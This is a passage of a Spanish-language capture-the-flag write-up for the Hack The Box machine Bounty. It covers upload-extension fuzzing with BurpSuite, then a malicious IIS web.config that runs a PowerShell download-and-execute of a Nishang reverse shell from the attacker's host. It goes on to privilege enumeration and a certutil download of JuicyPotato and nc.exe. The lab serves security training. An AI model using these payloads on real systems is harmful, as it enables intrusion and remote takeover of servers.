+</span></span><span style="display:flex;"><span>/uploadedFiles        <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 156<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.93/uploadedFiles/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/**http%3A.aspx       <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 11<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/uploadedfiles        <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 156<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.93/uploadedfiles/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/**http%3A%2F%2Fwww.aspx <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 11<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">661576</span> / <span style="color:#ae81ff">661683</span> <span style="color:#f92672">(</span>99.98%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-x</em></td>
+					<td>Para indicar las extensiones de archivos especificas a buscar.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Encontramos solamente un archivo llamado <strong>transfer.aspx</strong>, vamos a ver de que se trata:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-bounty/Captura3.png">
+</p>
+<p>Al parecer podemos subir un archivo, el problema es que no sabemos qué tipo de archivo acepta, así que tenemos dos opciones:</p>
+<ul>
+<li>Probar con varios tipos para ver cuál acepta.</li>
+<li>Usar <strong>BurpSuite</strong></li>
+</ul>
+<p>Vamos a probar con <strong>BurpSuite</strong>.</p>
+<h3 id="Attack">Realizando un Ataque Sniper con BurpSuite</h3>
+<p>Lo que haremos será capturar la subida de archivos del <strong>aspx</strong>.</p>
+<p>Abre <strong>BurpSuite</strong> y ponlo en modo de captura, lo que haré será intentar subir una <strong>Reverse Shell</strong> de <strong>PHP</strong> que tenia a la mano para captura la petición.</p>
+<hr>
+<p><strong>IMPORTANTE</strong></p>
+<p>Este ataque es tardado, así que ten paciencia.</p>
+<hr>
+<p>Sigamos:</p>
+<p alignn="center">
+<img src="/assets/images/htb-writeup-bounty/Captura4.png">
+</p>
+<p>Y vemos lo que se capturó:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-bounty/Captura5.png">
+</p>
+<p>Mandamos nuestra captura al <strong>Intruder</strong>, puedes hacerlo rapido con <strong>ctrl + i</strong>. Ahora dirigete al <strong>Intruder</strong> y ya debería estar ahí:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-bounty/Captura6.png">
+</p>
+<p>Podemos escoger el tipo de ataque que queremos y ahí veremos el <strong>ataque Sniper</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-bounty/Captura7.png">
+</p>
+<p>Bien, lo que debemos hacer es limpiar la captura para poder elegir donde vamos posicionar nuestro payload para el ataque, para eso solamente le damos click al botón <strong>clear</strong> que está del lado derecho y debería quedar así:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-bounty/Captura8.png">
+</p>
+<p>Del archivo que subimos, selecciona su extensión ya que es este el que vamos a usar para cargar nuestro payload, es decir, usaremos este archivo para que <strong>BurpSuite</strong> utilice un payload que escojamos e introduzca distintas extensiones para probar cual es la extensión que acepta la página:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-bounty/Captura9.png">
+</p>
+<p>Y le damos click en el botón <strong>Add</strong> que está arriba de <strong>clear</strong>, nos debería quedar así:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-bounty/Captura10.png">
+</p>
+<p>Ahora vamos a cargar el Payload con las extensiones, para hacerlo, vamos a la sección <strong>Payloads</strong> y le daremos click a <strong>Load</strong> de la sección <strong>Payload settings</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-bounty/Captura11.png">
+</p>
+<p>De ahí, nos iremos al directorio <strong>Seclists</strong> que está en el directorio <strong>/usr/share</strong>.</p>
+<p><strong>NOTA</strong>: El directorio <strong>Seclists</strong> lo tienes que instalar en tu máquina, ya que de momento, no viene preinstalado en Kali.</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-bounty/Captura12.png">
+</p>
+<p>Entramos en el directorio <strong>Discovery</strong> y luego en <strong>Web-Content</strong>, el archivo que buscamos es el llamado <strong>raft-medium-extensions-lowercase.txt</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-bounty/Captura13.png">
+</p>
+<p>Lo seleccionas, lo abres y ya estarán cargadas las extensiones:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-bounty/Captura14.png">
+</p>
+<p><strong>OJO</strong>, debemos quitar la opción <strong>Payload encoding</strong> porque como estamos usando extensiones, si no la quitamos, nos va a url encodear los puntos de cada extensión y no servirá el ataque:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-bounty/Captura17.png">
+</p>
+<p>Vamos bien, ahora ve a la sección <strong>Settings</strong> y vamos a la sección <strong>Grep - Extract</strong> para añadir una expresión regular que nos va a mostrar lo que queremos ver, en este caso, que extensión acepta la página:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-bounty/Captura15.png">
+</p>
+<p>Sigue las indicaciones, dale a <strong>Fecth Response</strong> y selecciona el error <strong>Invalid File. Please try again</strong>, esto para que nos reporte resultados que no tengan esta clase de expresión:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-bounty/Captura16.png">
+</p>
+<p>Y ya está listo el ataque, si nos vamos hasta arriba de <strong>BurpSuite</strong> podemos lanzar el ataque con la opción <strong>Start Attack</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-bounty/Captura18.png">
+</p>
+<p>Durante el ataque, veremos el siguiente archivo, este nos puede servir para buscar un Exploit:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-bounty/Captura19.png">
+</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="Exploit">Buscando un Exploit para Servicio IIS</h3>
+<p>Buscando por internet, encontre este blog que explica una vulnerabilidad en el <strong>servicio IIS v7 (y superiores)</strong> con el <strong>archivo web.config</strong>:</p>
+<ul>
+<li><a href="https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/" target="_blank">IIS - Web.config File Exploit</a></li>
+</ul>
+<p>Este <strong>archivo web.config</strong> es similar a subir un <strong>archivo .htacces</strong> a un <strong>servidor web Apache</strong> que es de su configuración, existen tecnicas para subir <strong>archivos .htaccess</strong> maliciosos y poder realizar acciones como un Bypass a las protecciones que tenga el servidor, esto (menciona el blog) también lo podemos aplicar para el <strong>servicio IIS v7 y superiores</strong>, vamos a comprobarlo.</p>
+<p>Vamos a utilizar el primer ejemplo que viene en el blog, pues lo que hace este archivo es una simple operación matemática de 2+1, el resultado debería mostrarse cuando se cargue este archivo en la página web.</p>
+<h4 id="Exploit2">Probando Archivo web.config Modificado</h4>
+<p>Copia ese ejemplo y lo llamaremos igual <strong>web.config</strong>, lo vamos a cargar a la página web para poder verla en alguno de los directorios <strong>uploadFiles</strong> que nos mostro <strong>gobuster</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-bounty/Captura20.png">
+</p> 
+<p align="center">
+<img src="/assets/images/htb-writeup-bounty/Captura21.png">
+</p>
+<p>Sabemos que ya se guardo con exito, antes de probar cualquier de los 3 directorios que encontro <strong>gobuster</strong>, vamos a comprobar si existen más directorios tipo <strong>upload</strong> con <strong>wfuzz</strong>.</p>
+<p>Vamos a hacer un <strong>Fuzzing</strong>, pero usando un diccionario qué este enfocado a directorios que sean para cargar archivos, es decir, los tipo <strong>upload</strong>. Para esto, vamos a hacer un <strong>grep</strong> al <strong>wordlist</strong> de <strong>Dirbuster</strong>, que siempre he usado, que sería el <strong>dirbuster/directory-list-2.3-medium.txt</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | grep -i upload
+</span></span><span style="display:flex;"><span>uploads
+</span></span><span style="display:flex;"><span>upload
+</span></span><span style="display:flex;"><span>WPupload
+</span></span><span style="display:flex;"><span>uploaded_images
+</span></span><span style="display:flex;"><span>uploaded
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Bien, salen bastantes resultados. Vamos a guardarlos en un archivo <strong>.txt</strong> para usarlo como diccionario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | grep -i upload &gt; diccionario.txt
+</span></span></code></pre></div><p>Ahora vamos a usar <strong>wfuzz</strong> y usaremos el diccionario que creamos para que solamente busque los directorios tipo <strong>upload</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wfuzz -c --hc<span style="color:#f92672">=</span><span style="color:#ae81ff">404</span> -t <span style="color:#ae81ff">200</span> -w <span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span>/diccionario.txt http://10.10.10.93/FUZZ/
+</span></span><span style="display:flex;"><span> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span style="color:#960050;background-color:#1e0010">&#39;</span>s documentation <span style="color:#66d9ef">for</span> more information.
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://10.10.10.93/FUZZ/
+</span></span><span style="display:flex;"><span>Total requests: 46
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload                                                               
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>000000014:   <span style="color:#ae81ff">403</span>        <span style="color:#ae81ff">29</span> L     <span style="color:#ae81ff">92</span> W       <span style="color:#ae81ff">1233</span> Ch     <span style="color:#e6db74">&#34;uploadedFiles&#34;</span>                                                       
+</span></span><span style="display:flex;"><span>000000024:   <span style="color:#ae81ff">403</span>        <span style="color:#ae81ff">29</span> L     <span style="color:#ae81ff">92</span> W       <span style="color:#ae81ff">1233</span> Ch     <span style="color:#e6db74">&#34;uploadedfiles&#34;</span>                                                       
+</span></span><span style="display:flex;"><span>000000011:   <span style="color:#ae81ff">403</span>        <span style="color:#ae81ff">29</span> L     <span style="color:#ae81ff">92</span> W       <span style="color:#ae81ff">1233</span> Ch     <span style="color:#e6db74">&#34;UploadedFiles&#34;</span>                                                       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Total time: 0.600349
+</span></span><span style="display:flex;"><span>Processed Requests: <span style="color:#ae81ff">46</span>
+</span></span><span style="display:flex;"><span>Filtered Requests: <span style="color:#ae81ff">43</span>
+</span></span><span style="display:flex;"><span>Requests/sec.: 76.62198
+</span></span></code></pre></div><p>Muy bien, ya comprobamos que no encontro más directorios de este tipo aunque me reporta un código de estado distinto a <strong>gobuster</strong>, siendo el código de estado de 403, ósea que existen estos directorios, pero no tenemos acceso a ellos.</p>
+<p>Nosotros ya sabemos que se guardó nuestro archivo <strong>web.config</strong>, aunque no tengamos permiso para ver/entrar estos directorios, si conocemos el nombre del archivo que buscamos, podremos verlo sin ningún problema.</p>
+<p>Ve al directorio <strong>uploadFiles</strong>, pon el nombre <strong>web.config</strong> y deberíamos ver un 3, si no se ve, vuelve a subir el archivo y carga la página otra vez:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-bounty/Captura22.png">
+</p>
+<p>Excelente, entonces podemos aprovecharnos de esto para poder ganar acceso a la máquina.</p>
+<h3 id="Exploit3">Probando Archivo web.config Malicioso y Ganando Acceso a la Máquina</h3>
+<p>Para realizar esto, vamos a cambiar el script del <strong>web.config</strong> para que pueda cargar un <strong>Payload</strong> de una <strong>Reverse Shell</strong> y nos pueda conectar a la máquina. El <strong>Payload</strong> que vamos a ocupar será de <strong>Nishang</strong>, usaremos el <strong>Invoke-PowerShellTcp.ps1</strong>.</p>
+<p>Vamos por pasos:</p>
+<ul>
+<li>Copiamos el archivo en nuestra máquina:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+</span></span><span style="display:flex;"><span>--2023-04-24 21:13:28--  https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+</span></span><span style="display:flex;"><span>Resolviendo raw.githubusercontent.com <span style="color:#f92672">(</span>raw.githubusercontent.com<span style="color:#f92672">)</span>... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
+</span></span><span style="display:flex;"><span>Conectando con raw.githubusercontent.com <span style="color:#f92672">(</span>raw.githubusercontent.com<span style="color:#f92672">)[</span>185.199.108.133<span style="color:#f92672">]</span>:443... conectado.
+</span></span><span style="display:flex;"><span>Petición HTTP enviada, esperando respuesta... <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Longitud: <span style="color:#ae81ff">4339</span> <span style="color:#f92672">(</span>4.2K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>text/plain<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Grabando a: «Invoke-PowerShellTcp.ps1»
+</span></span><span style="display:flex;"><span>-
+</span></span><span style="display:flex;"><span>Invoke-PowerShellTcp.ps1          100%<span style="color:#f92672">[============================================================</span>&gt;<span style="color:#f92672">]</span>   4.24K  --.-KB/s    en 0s      
+</span></span><span style="display:flex;"><span>-
+</span></span><span style="display:flex;"><span>2023-04-24 21:13:28 <span style="color:#f92672">(</span>83.7 MB/s<span style="color:#f92672">)</span> - «Invoke-PowerShellTcp.ps1» guardado <span style="color:#f92672">[</span>4339/4339<span style="color:#f92672">]</span>
+</span></span></code></pre></div><ul>
+<li>Dentro del <strong>.ps1</strong>, vamos a agregar una línea que nos recomienda el mismo Payload al final:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>Invoke-PowerShellTcp -Reverse -IPAddress Tu_IP -Port <span style="color:#ae81ff">443</span>
+</span></span></code></pre></div><ul>
+<li>Ahora vamos a cambiar el <strong>web.config</strong>. El siguiente oneliner de <strong>ASP</strong> nos ayudara, ya que ese indica el archivo:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>&lt;<span style="color:#66d9ef">%</span>response.write CreateObject(<span style="color:#e6db74">&#34;WScript.Shell&#34;</span>).Exec(Request.QueryString(<span style="color:#e6db74">&#34;cmd&#34;</span>)).StdOut.Readall()%&gt;
+</span></span></code></pre></div><ul>
+<li>Lo copiamos y sustituimos la operación que se hizo en el <strong>web.config</strong>. Así debería quedar:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>&lt;!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
+</span></span><span style="display:flex;"><span>&lt;%
+</span></span><span style="display:flex;"><span>Set co = CreateObject(<span style="color:#e6db74">&#34;WScript.Shell&#34;</span>)
+</span></span><span style="display:flex;"><span>Set cte = co.Exec(<span style="color:#e6db74">&#34;cmd /c powershell IEX(New-Object Net.WebClient).downloadString(&#39;http://Tu_IP:80/Reverse_Shell.ps1&#39;)&#34;</span>)
+</span></span><span style="display:flex;"><span>output = cte.StdOut.Readall()
+</span></span><span style="display:flex;"><span>Response.write(output)
+</span></span><span style="display:flex;"><span>%&gt;
+</span></span><span style="display:flex;"><span>--&gt;
+</span></span></code></pre></div><p>Adentro de la función <strong>co.Exec</strong> pondremos el oneliner para cargar el Payload <strong>.ps1</strong>.</p>
+<p>Ya tenemos todo listo, lo que sigue es cargar el <strong>web.config</strong> y abriremos un servidor en <strong>Python</strong> para cargar el Payload.</p>
+<p>Vamos igual por pasos:</p>
+<ul>
+<li>Abre un servidor en <strong>Python</strong> en donde tengas el <strong>.ps1</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><ul>
+<li>Abre una <strong>netcat</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>   
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><ul>
+<li>
+<p>Carga el <strong>web.config</strong> y recarga la página web.</p>
+</li>
+<li>
+<p>Y ya deberíamos estar conectados:</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>   
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.93<span style="color:#f92672">]</span> <span style="color:#ae81ff">49158</span>
+</span></span><span style="display:flex;"><span>Windows PowerShell running as user BOUNTY$ on BOUNTY
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2015</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\w</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\i</span>netsrv&gt;whoami
+</span></span><span style="display:flex;"><span>bounty<span style="color:#ae81ff">\m</span>erlin
+</span></span></code></pre></div><p>Ahora, buscamos la flag del usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>PS C:\windows\system32\inetsrv&gt; cd C:\
+</span></span><span style="display:flex;"><span>PS C:\&gt; dir
+</span></span><span style="display:flex;"><span>    Directory: C:\
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime     Length Name                              
+</span></span><span style="display:flex;"><span>----                -------------     ------ ----                              
+</span></span><span style="display:flex;"><span>d----         5/30/2018   4:14 AM            inetpub                           
+</span></span><span style="display:flex;"><span>d----         7/14/2009   6:20 AM            PerfLogs                          
+</span></span><span style="display:flex;"><span>d-r--         6/10/2018   3:43 PM            Program Files                     
+</span></span><span style="display:flex;"><span>d-r--         7/14/2009   8:06 AM            Program Files (x86)               
+</span></span><span style="display:flex;"><span>d-r--         5/31/2018  12:18 AM            Users                             
+</span></span><span style="display:flex;"><span>d----         5/31/2018  11:37 AM            Windows                           
+</span></span><span style="display:flex;"><span>PS C:\&gt; cd Users
+</span></span><span style="display:flex;"><span>PS C:\Users&gt; dir
+</span></span><span style="display:flex;"><span>    Directory: C:\Users
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime     Length Name                              
+</span></span><span style="display:flex;"><span>----                -------------     ------ ----                              
+</span></span><span style="display:flex;"><span>d----         5/31/2018  12:18 AM            Administrator                     
+</span></span><span style="display:flex;"><span>d----         5/30/2018   4:44 AM            Classic .NET AppPool              
+</span></span><span style="display:flex;"><span>d----         5/30/2018  12:22 AM            merlin                            
+</span></span><span style="display:flex;"><span>d-r--         5/30/2018   5:44 AM            Public                            
+</span></span><span style="display:flex;"><span>PS C:\Users&gt; cd merlin/Desktop
+</span></span><span style="display:flex;"><span>PS C:\Users\merlin\Desktop&gt; dir
+</span></span></code></pre></div><p>No hay nada, que raro.</p>
+<p>Lo que pasa, es que se les ocurrió ocultar la flag, entonces vamos a ver los archivos ocultos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>PS C:\Users\merlin\Desktop&gt; dir -Force
+</span></span><span style="display:flex;"><span>    Directory: C:\Users\merlin\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime     Length Name                              
+</span></span><span style="display:flex;"><span>----                -------------     ------ ----                              
+</span></span><span style="display:flex;"><span>-a-hs         5/30/2018  12:22 AM        282 desktop.ini                       
+</span></span><span style="display:flex;"><span>-arh-         4/25/2023  10:17 PM         34 user.txt                          
+</span></span><span style="display:flex;"><span>PS C:\Users\merlin\Desktop&gt; type user.txt
+</span></span></code></pre></div><p>Excelente, es tiempo de escalar privilegios.</p>
+<h2 id="Post">Post Explotación</h2>
+<h3 id="Enum">Enumeración de Máquina Víctima</h3>
+<p>Veamos qué privilegios tenemos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>PS C:\&gt; whoami /priv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Privilege Name                Description                               State   
+</span></span><span style="display:flex;"><span>============================= ========================================= ========
+</span></span><span style="display:flex;"><span>SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+</span></span><span style="display:flex;"><span>SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+</span></span><span style="display:flex;"><span>SeAuditPrivilege              Generate security audits                  Disabled
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+</span></span><span style="display:flex;"><span>SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+</span></span></code></pre></div><p>Con el privilegio <strong>SeImpersonatePrivilege</strong> ya sabemos que podemos usar el <strong>Juicy Potato</strong>.</p>
+<p>Veamos que SO tiene la máquina:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>PS C:\&gt; systeminfo
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host Name:                 BOUNTY
+</span></span><span style="display:flex;"><span>OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
+</span></span><span style="display:flex;"><span>OS Version:                6.1.7600 N/A Build 7600
+</span></span><span style="display:flex;"><span>OS Manufacturer:           Microsoft Corporation
+</span></span><span style="display:flex;"><span>OS Configuration:          Standalone Server
+</span></span><span style="display:flex;"><span>OS Build Type:             Multiprocessor Free
+</span></span><span style="display:flex;"><span>Registered Owner:          Windows User
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Está usando <strong>Microsoft Windows Server 2008 R2 Datacenter</strong>. Ahora, busquemos el <strong>Juicy Potato</strong>.</p>
+<ul>
+<li><a href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1" target="_blank">Repositorio de ohpe: Juicy Potato - Releases</a></li>
+</ul>
+<p>Descarga él <strong>.exe</strong>, busca una <strong>nc.exe</strong> y cópiala en la misma carpeta que en donde esté el <strong>Juicy Potato</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>locate nc.exe
+</span></span><span style="display:flex;"><span>/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
+</span></span><span style="display:flex;"><span>/usr/share/windows-resources/binaries/nc.exe
+</span></span><span style="display:flex;"><span>cp /usr/share/windows-resources/binaries/nc.exe .
+</span></span></code></pre></div><p>Para cargar el <strong>Juicy Potato</strong> y la <strong>nc.exe</strong>, vamos a utilizar la herramienta <strong>certutil.exe</strong> de la máquina víctima y abriendo un servidor de <strong>Python</strong>.</p>
+<p>Hagámoslo por pasos:</p>
+<ul>
+<li>Abre el servidor de <strong>Python</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><ul>
+<li>En la máquina víctima, crea un directorio en el directorio <strong>/Temp</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>PS C:\&gt; cd Windows/Temp
+</span></span><span style="display:flex;"><span>PS C:\Windows\Temp&gt; mkdir Privesc
+</span></span><span style="display:flex;"><span>    Directory: C:\Windows\Temp
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime     Length Name                              
+</span></span><span style="display:flex;"><span>----                -------------     ------ ----                              
+</span></span><span style="display:flex;"><span>d----         4/25/2023  10:46 PM            Privesc                           
+</span></span><span style="display:flex;"><span>PS C:\Windows\Temp&gt; cd Privesc
+</span></span><span style="display:flex;"><span>PS C:\Windows\Temp\Privesc&gt;
+</span></span></code></pre></div><ul>
+<li>Usa <strong>certutil.exe</strong> para descargar ambos archivos:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>PS C:\Windows\Temp\Privesc&gt; certutil.exe -urlcache -split -f http://Tu_IP:8000/JuicyPotato.exe JuicyPotato.exe
+</span></span><span style="display:flex;"><span>****  Online  ****
+</span></span><span style="display:flex;"><span>  000000  ...
+</span></span><span style="display:flex;"><span>  054e00
+</span></span><span style="display:flex;"><span>CertUtil: -URLCache command completed successfully.
+</span></span><span style="display:flex;"><span>PS C:\Windows\Temp\Privesc&gt; dir
+</span></span><span style="display:flex;"><span>    Directory: C:\Windows\Temp\Privesc
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime     Length Name                              
+</span></span><span style="display:flex;"><span>----                -------------     ------ ----                              
